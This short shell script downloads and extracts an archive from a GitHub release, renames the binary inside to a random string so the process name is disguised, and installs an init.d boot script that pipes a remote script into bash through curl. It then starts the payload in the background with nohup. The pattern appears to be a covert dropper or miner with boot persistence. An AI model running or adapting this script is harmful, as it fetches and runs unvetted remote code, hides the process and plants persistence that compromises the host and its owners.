cd /
wget https://github.com/leansax/emplop/releases/download/v0.0.3.0/semako.tar
tar -xvf semako.tar
cd /semako
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv jimblo $variable1
sed -i "s/oodo/${variable1} -n=${variable1}/g" ./empang.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/leansax/emplop/main/konglo.sh)" > hoursed.sh
chmod a+x hoursed.sh
update-rc.d hoursed.sh defaults
rm -rf semako.tar
cd /semako
nohup ./empang.sh
ps -ef | grep semako
